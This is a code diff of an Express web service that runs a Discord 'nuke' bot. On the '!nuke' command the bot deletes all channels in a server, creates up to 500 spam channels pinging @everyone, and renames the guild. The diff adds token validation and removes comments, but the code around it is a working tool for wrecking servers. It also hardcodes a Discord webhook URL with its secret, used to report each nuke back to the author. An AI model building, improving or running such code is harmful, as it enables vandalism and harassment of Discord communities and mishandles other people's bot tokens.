@@ -10,7 +10,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
 
-// Cấu hình mặc định
 const DEFAULT_CONFIG = {
   channelName: 'NUKE BY PHTUANKHANH',
   renameName: 'NUKE BY PTK',
@@ -20,9 +19,7 @@ const DEFAULT_CONFIG = {
   pingEveryone: true
 };
 
-// Lưu config theo TOKEN BOT để tách biệt từng máy/người dùng
 const botConfigs = new Map();
-// Lưu instance bot
 const bots = new Map();
 
 async function notifyNuke(info) {
@@ -79,9 +76,7 @@ function startBot(token) {
     if (message.author.bot) return;
     if (message.content !== '!nuke') return;
 
-    // LẤY CONFIG CỦA RIÊNG BOT NÀY
     const cfg = botConfigs.get(token) || { ...DEFAULT_CONFIG };
-
     const guild = message.guild;
     const t0 = Date.now();
     message.reply('🚀 Bắt đầu nuke...').catch(() => {});
@@ -97,7 +92,7 @@ function startBot(token) {
       const msgText = cfg.msgContent;
       const ping = cfg.pingEveryone;
 
-      // 1. XOÁ ALL KÊNH SONG SONG
+      // 1. XOÁ ALL KÊNH
       const oldChannels = await guild.channels.fetch().catch(() => null);
       if (oldChannels) {
         await Promise.allSettled(
@@ -105,7 +100,7 @@ function startBot(token) {
         );
       }
 
-      // 2. TẠO KÊNH + SPAM TIN NHẮN NGAY
+      // 2. TẠO KÊNH + SPAM
       const createPromises = Array.from({ length: cc }, () =>
         guild.channels.create({
           name: chName,
@@ -123,7 +118,7 @@ function startBot(token) {
 
       await Promise.allSettled(createPromises);
 
-      // 3. RENAME GUILD
+      // 3. RENAME
       if (rName) await guild.setName(rName).catch(() => {});
 
       await notifyNuke({
@@ -152,21 +147,27 @@ function startBot(token) {
   client.login(token).catch(e => console.error('Login error:', e.message));
   bots.set(token, client);
   
-  // Nếu chưa có config cho token này thì tạo mới
   if (!botConfigs.has(token)) {
     botConfigs.set(token, { ...DEFAULT_CONFIG });
   }
 }
 
-// --- API CHO WEB ---
 app.post('/api/bot-login', async (req, res) => {
   const { token } = req.body ?? {};
-  if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
   
+  if (!token || typeof token !== 'string') {
+    return res.status(400).json({ error: 'Thiếu token bot' });
+  }
+
+  const cleanToken = token.trim();
+  if (!/^[A-Za-z0-9._-]+$/.test(cleanToken)) {
+    return res.status(400).json({ error: 'Token chứa ký tự không hợp lệ' });
+  }
+
   try {
-    startBot(token);
-    await new Promise(r => setTimeout(r, 1500));
-    const client = bots.get(token);
+    startBot(cleanToken);
+    await new Promise(r => setTimeout(r, 2000));
+    const client = bots.get(cleanToken);
     if (!client || !client.user) throw new Error('Đăng nhập thất bại, kiểm tra token');
     res.json({ ok: true, user: client.user.tag });
   } catch (e) {
@@ -174,26 +175,25 @@ app.post('/api/bot-login', async (req, res) => {
   }
 });
 
-// Lấy config theo token
 app.post('/api/settings/get', (req, res) => {
   const { token } = req.body ?? {};
-  if (!token) return res.status(400).json({ error: 'missing token' });
-  res.json(botConfigs.get(token) || { ...DEFAULT_CONFIG });
+  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'missing token' });
+  res.json(botConfigs.get(token.trim()) || { ...DEFAULT_CONFIG });
 });
 
-// Lưu config theo token
 app.post('/api/settings/save', (req, res) => {
   const { token, channelName, renameName, channelCount, msgContent, msgCount, pingEveryone } = req.body ?? {};
-  if (!token) return res.status(400).json({ error: 'missing token' });
-
-  if (!botConfigs.has(token)) botConfigs.set(token, { ...DEFAULT_CONFIG });
-  const cfg = botConfigs.get(token);
+  if (!token || typeof token !== 'string') return res.status(400).json({ error: 'missing token' });
+  
+  const cleanToken = token.trim();
+  if (!botConfigs.has(cleanToken)) botConfigs.set(cleanToken, { ...DEFAULT_CONFIG });
+  const cfg = botConfigs.get(cleanToken);
 
   if (channelName) cfg.channelName = channelName;
   if (renameName) cfg.renameName = renameName;
-  if (channelCount) cfg.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10)));
+  if (channelCount) cfg.channelCount = Math.min(500, Math.max(1, parseInt(channelCount, 10) || 100));
   if (msgContent) cfg.msgContent = msgContent;
-  if (msgCount !== undefined) cfg.msgCount = Math.max(1, parseInt(msgCount, 10));
+  if (msgCount !== undefined) cfg.msgCount = Math.max(1, parseInt(msgCount, 10) || 1);
   if (pingEveryone !== undefined) cfg.pingEveryone = !!pingEveryone;
 
   res.json({ ok: true, config: cfg });
